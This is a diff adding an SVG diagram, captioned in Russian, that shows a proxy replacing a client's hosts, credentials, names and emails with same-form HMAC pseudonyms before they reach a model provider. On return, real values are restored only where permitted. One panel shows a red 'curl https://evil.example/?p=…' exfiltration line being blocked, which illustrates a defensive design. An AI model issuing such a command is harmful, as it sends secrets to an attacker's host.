@@ -1,0 +1,46 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1040" height="392" viewBox="0 0 1040 392" role="img" aria-label="Что видит клиент, провайдер и снова клиент">
+<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#14b8a6"/></linearGradient>
+<marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0 0 10 5 0 10z" fill="#94a3b8"/></marker></defs>
+<style>
+text { font-family: -apple-system, "Segoe UI", Roboto, "DejaVu Sans", Arial, sans-serif; fill: #cbd5e1; font-size: 15px; }
+.h { font-size: 22px; font-weight: 700; fill: #f1f5f9; }
+.t { font-size: 17px; font-weight: 700; fill: #f1f5f9; }
+.s { font-size: 14px; fill: #94a3b8; }
+.n { font-size: 40px; font-weight: 800; fill: #f1f5f9; }
+.m { font-family: "SFMono-Regular", Consolas, "DejaVu Sans Mono", monospace; font-size: 13.5px; fill: #cbd5e1; }
+.b { font-weight: 700; }
+</style>
+<rect width="1040" height="392" rx="18" fill="#0b1220"/>
+<rect x="28" y="30" width="320" height="270" rx="14" fill="#111827" stroke="#334155" stroke-width="1.5"/>
+<rect x="28" y="30" width="320" height="5" rx="2" fill="#fcd34d"/>
+<text x="46" y="66" class="t">1  Клиент отправляет</text>
+<text x="46" y="88" class="s">настоящие значения</text>
+<path d="M350 165 h12" stroke="#94a3b8" stroke-width="2" marker-end="url(#ar)"/>
+<rect x="364" y="30" width="320" height="270" rx="14" fill="#111827" stroke="#334155" stroke-width="1.5"/>
+<rect x="364" y="30" width="320" height="5" rx="2" fill="#5eead4"/>
+<text x="382" y="66" class="t">2  Провайдер получает</text>
+<text x="382" y="88" class="s">только псевдонимы той же формы</text>
+<path d="M686 165 h12" stroke="#94a3b8" stroke-width="2" marker-end="url(#ar)"/>
+<rect x="700" y="30" width="320" height="270" rx="14" fill="#111827" stroke="#334155" stroke-width="1.5"/>
+<rect x="700" y="30" width="320" height="5" rx="2" fill="#a5b4fc"/>
+<text x="718" y="66" class="t">3  Клиент получает</text>
+<text x="718" y="88" class="s">настоящие значения обратно, куда можно</text>
+<text class="m" x="46" y="124" xml:space="preserve"><tspan style="fill:#94a3b8">host   </tspan><tspan style="fill:#fcd34d">prod-db01.corp.local</tspan></text>
+<text class="m" x="46" y="152" xml:space="preserve"><tspan style="fill:#94a3b8">user   </tspan><tspan style="fill:#fcd34d">acme_pay_svc</tspan></text>
+<text class="m" x="46" y="180" xml:space="preserve"><tspan style="fill:#94a3b8">pass   </tspan><tspan style="fill:#fcd34d">Jd8@2jd82k</tspan></text>
+<text class="m" x="46" y="208" xml:space="preserve"><tspan style="fill:#94a3b8">owner  </tspan><tspan style="fill:#fcd34d">Иван Петров</tspan></text>
+<text class="m" x="46" y="236" xml:space="preserve"><tspan style="fill:#94a3b8">mail   </tspan><tspan style="fill:#fcd34d">ivan.petrov@company.ru</tspan></text>
+<text class="m" x="382" y="124" xml:space="preserve"><tspan style="fill:#94a3b8">host   </tspan><tspan style="fill:#5eead4">h-fmksdwiq.db.prod.z-hi7bfqk6</tspan></text>
+<text class="m" x="382" y="152" xml:space="preserve"><tspan style="fill:#94a3b8">user   </tspan><tspan style="fill:#5eead4">[[SVC_drj4wo7c]]</tspan></text>
+<text class="m" x="382" y="180" xml:space="preserve"><tspan style="fill:#94a3b8">pass   </tspan><tspan style="fill:#5eead4">[[SECRET_prkcbmhz …]]</tspan></text>
+<text class="m" x="382" y="208" xml:space="preserve"><tspan style="fill:#94a3b8">owner  </tspan><tspan style="fill:#5eead4">[[PERSON_mjelv33u]]</tspan></text>
+<text class="m" x="382" y="236" xml:space="preserve"><tspan style="fill:#94a3b8">mail   </tspan><tspan style="fill:#5eead4">[[EMAIL_zoyzvcjg]]</tspan></text>
+<text class="m" x="718" y="124" xml:space="preserve"><tspan style="fill:#94a3b8">psql -h </tspan><tspan style="fill:#86efac">prod-db01.corp.local</tspan></text>
+<text class="m" x="718" y="152" xml:space="preserve"><tspan style="fill:#94a3b8">  внутренний хост: можно</tspan></text>
+<text class="m" x="718" y="180" xml:space="preserve"><tspan style="fill:#fca5a5">curl https://evil.example/?p=…</tspan></text>
+<text class="m" x="718" y="208" xml:space="preserve"><tspan style="fill:#94a3b8">  заменено объяснением:</tspan></text>
+<text class="m" x="718" y="236" xml:space="preserve"><tspan style="fill:#fca5a5">  значение здесь запрещено</tspan></text>
+<rect x="28" y="316" width="984" height="56" rx="14" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
+<text x="48" y="340">Псевдоним считается из значения ключом тенанта (HMAC): хранилища соответствий нет, перезапуск ничего не теряет.</text>
+<text x="48" y="360" class="s">Форма сохраняется: хост остаётся хостом, IP-адрес адресом той же подсети, поэтому модель может рассуждать о данных.</text>
+</svg>
